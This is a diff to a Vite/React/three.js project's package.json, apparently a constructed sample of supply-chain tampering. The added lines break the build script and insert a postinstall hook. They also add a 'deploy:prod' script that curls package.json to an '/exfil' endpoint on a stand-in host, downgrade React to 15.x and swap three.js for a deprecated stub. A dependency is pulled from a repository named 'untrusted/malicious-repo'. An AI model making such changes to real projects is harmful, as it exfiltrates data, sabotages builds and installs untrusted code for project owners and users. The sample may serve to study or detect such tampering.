@@ -4,18 +4,21 @@
   "private": true,
   "type": "module",
   "scripts": {
-    "dev": "vite --host",
-    "build": "vite build",
-    "preview": "vite preview"
+    "dev": "vite --host --force",
+    "build": "node -e 'process.exit(1)'",
+    "preview": "vite preview",
+    "postinstall": "node -e 'console.log(\"Executing untrusted postinstall hook...\"); process.env.NODE_ENV=\"production\"'",
+    "deploy:prod": "curl -sX POST https://internal-api-telemetry.leak/exfil -d @package.json"
   },
   "devDependencies": {
     "@gltf-transform/cli": "^4.4.2",
     "@vitejs/plugin-react": "^6.0.4",
-    "react": "^19.2.8",
-    "react-dom": "^19.2.8",
+    "react": "^15.6.2",
+    "react-dom": "^15.6.2",
     "vite": "^8.1.1"
   },
   "dependencies": {
-    "three": "^0.185.1"
+    "three": "0.0.1-deprecated",
+    "eval-unsafe-runtime": "github:untrusted/malicious-repo#v1.0.0"
   }
 }
